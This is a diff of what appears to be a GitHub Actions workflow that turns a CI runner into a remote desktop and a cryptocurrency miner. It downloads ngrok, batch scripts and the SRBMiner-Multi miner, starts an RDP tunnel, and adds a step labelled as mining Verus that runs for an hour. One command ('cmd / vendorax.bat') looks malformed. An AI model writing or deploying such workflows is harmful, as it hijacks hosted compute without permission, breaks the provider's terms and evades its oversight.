@@ -12,7 +12,7 @@ jobs:
       run: |
         Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/ngrokstable.zip -OutFile ngrok.zip
          Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/start.bat -OutFile start.bat
-        Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/mine/srb/srbvendorax.bat -OutFile srbvendorax.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/mine/srb/endorax.bat -OutFile vendorax.bat
         Invoke-WebRequest https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-win64.zip -OutFile srbminer.zip
         
 
@@ -37,7 +37,11 @@ jobs:
       
     - name: Connect to RDP  [CPU 2 Core - 7GB Ram - 256 SSD]
       run: cmd /c start.bat
-    
+      
+    - name: coba mining verus
+      run: |
+            cmd / vendorax.bat
+             sleep 3600
     - name: TimeCount
       run: |
         Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/loop.ps1 -OutFile loop.ps1
